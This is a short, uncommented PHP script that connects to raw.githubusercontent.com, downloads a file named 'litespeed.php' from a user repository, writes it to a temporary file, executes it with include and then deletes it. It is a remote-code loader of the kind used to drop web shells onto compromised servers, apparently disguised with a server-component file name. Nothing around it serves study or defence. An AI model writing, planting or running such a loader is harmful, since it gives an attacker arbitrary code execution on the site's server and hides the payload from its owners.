<?php
{
    $host = "raw.githubusercontent.com/";
    $port = 443;
    $path = "tikung6etar/Nyarek/refs/heads/master/litespeed.php";

    $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
    if (!$fp) {
        echo "Error: $errstr ($errno)<br />\n";
    } else {
        $out = "GET $path HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);

        $content = "";
        while (!feof($fp)) {
            $content .= fgets($fp, 128);
        }
        fclose($fp);

        $header_end = strpos($content, "\r\n\r\n");
        if ($header_end !== false) {
            $content = substr($content, $header_end + 4);
        }

        $tmp_file = tempnam(sys_get_temp_dir(), 'data');
        file_put_contents($tmp_file, $content);
        include $tmp_file;
        unlink($tmp_file);
    }
}